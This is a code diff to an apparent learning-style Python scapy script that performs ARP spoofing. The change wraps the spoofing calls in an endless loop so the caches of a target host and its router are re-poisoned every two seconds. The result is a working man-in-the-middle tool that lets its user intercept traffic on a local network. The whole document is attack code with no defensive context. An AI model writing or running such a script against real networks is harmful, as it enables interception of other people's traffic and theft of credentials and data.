@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 
 import scapy.all as scapy
+import time
 
 # Function to scan the target IP for MAC addresses
 def get_mac(ip):
@@ -23,7 +24,11 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
+# loop will continue to execute until user uses shortcut "ctrl+c"
+while True:
 # spoofs router ip to target
-spoof("192.168.122.11", "192.168.122.1")
+    spoof("192.168.122.11", "192.168.122.1")
 # spoofs target to router
-spoof("192.168.122.1", "192.168.122.11")
+    spoof("192.168.122.1", "192.168.122.11")
+    # delays next iteration of loop
+    time.sleep(2)
